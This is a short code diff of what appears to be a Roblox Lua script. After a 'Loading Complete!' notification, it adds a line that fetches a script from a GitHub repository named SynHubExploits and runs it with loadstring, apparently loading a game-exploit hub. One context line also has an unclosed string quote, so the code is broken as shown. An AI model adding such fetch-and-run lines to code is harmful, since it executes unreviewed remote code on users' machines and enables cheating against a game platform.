@@ -13,3 +13,5 @@ game:GetService("StarterGui"):SetCore("SendNotification", {
     Text = "Loading Complete!,
     Duration = 5
   })
+Wait(5)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SynHubExploits/SynHub/main/DashBoard.lua"))()
